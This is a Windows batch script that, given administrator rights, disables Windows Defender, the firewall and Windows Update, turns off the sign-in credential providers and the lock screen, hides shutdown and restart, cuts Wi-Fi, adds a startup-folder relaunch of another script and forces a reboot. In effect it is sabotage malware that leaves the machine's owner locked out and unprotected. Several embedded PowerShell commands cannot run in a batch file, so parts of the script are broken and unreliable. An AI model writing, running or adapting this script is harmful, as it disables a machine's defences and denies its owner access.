@echo off
setlocal enabledelayedexpansion
net session >nul 2>&1
if %errorlevel% == 0 (
    pushd "%CD%"
    CD /D "%~dp0"
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    REG QUERY "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware >nul 2>&1
    REG QUERY "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" | findstr /i "DisableAntiSpyware" | findstr "0x1" >nul
    REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
    REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
    sc stop WinDefend >nul 2>&1
    taskkill /f /im "MsMpEng.exe" >nul 2>&1
    net stop mpssvc
    net stop BFE
    net stop wtd
    reg add "HKLM\SYSTEM\CurrentControlSet\Services\mpssvc" /v "Start" /t REG_DWORD /d "4" /f
    reg add "HKLM\SYSTEM\CurrentControlSet\Services\BFE" /v "Start" /t REG_DWORD /d "4" /f
    reg add "HKLM\SYSTEM\CurrentControlSet\Services\wtd" /v "Start" /t REG_DWORD /d "4" /f
    powercfg /change monitor-timeout-ac 0
    powercfg /change disk-timeout-ac 0
    powercfg /change standby-timeout-ac 0
    powercfg /change hibernate-timeout-ac 0
    sc config wuauserv start= disabled
    sc qc wuauserv
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Start_PowerButtonAction /t REG_DWORD /d 100 /f
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Personalization" /v NoLockScreen /t REG_DWORD /d 1 /f
    REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers\{60b78e88-ead8-445c-9cfd-0b87f74ea6cd}" /v Disabled /t REG_DWORD /d 1 /f
    REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers\{D6886603-9D2F-4EB2-B667-1971041FA96B}" /v Disabled /t REG_DWORD /d 1 /f
    REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers\{C885AA15-1764-4293-B82A-0586ADD46B35}" /v Disabled /t REG_DWORD /d 1 /f
    REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers\{8AF662BF-65A0-4D0A-A540-A338A999D36F}" /v Disabled /t REG_DWORD /d 1 /f
    REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers\{BEC09223-B018-416D-A0AC-523971B639F5}" /v Disabled /t REG_DWORD /d 1 /f
    REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers\{2135f72a-90b5-4ed3-a7f1-8bb705ac276a}" /v Disabled /t REG_DWORD /d 1 /f
    REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers\{1b283861-754f-4022-ad47-a5eaaa618894}" /v Disabled /t REG_DWORD /d 1 /f
    REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers\{1ee7337f-85ac-45e2-a23c-37c753209769}" /v Disabled /t REG_DWORD /d 1 /f
    REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers\{8FD7E19C-3BF7-489B-A72C-846AB3678C96}" /v Disabled /t REG_DWORD /d 1 /f
    REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers\{94596c7e-3744-41ce-893e-bbf09122f76a}" /v Disabled /t REG_DWORD /d 1 /f
    Install-Module -Name PolicyFileEditor -SkipPublisherCheck -Force
    $RegPath = 'Software\Microsoft\Windows\CurrentVersion\Policies\Explorer'
    $RegName = 'NoClose'
    $RegData = '1'
    $RegType = 'DWord'
    Set-PolicyFileEntry -Path $UserDir -Key $RegPath -ValueName $RegName -Data $RegData -Type $RegType
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\PolicyManager\default\Start\HideRestart" -Name "value" -Value 1
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\PolicyManager\default\Start\HideShutDown" -Name "value" -Value 1
    netsh interface set interface "Wi-Fi" admin=disabled
    for /f "usebackq tokens=*" %%i in (`powershell -command "[Environment]::GetFolderPath('CommonStartup')"`) do set startupPath=%%i
    cd /d "%startupPath%"
    echo start "" "%~dp0japper.bat">japperstarter.bat
    popd
    shutdown /r
) else (
    start "" "%~dp0japper_killer.bat"
    
)
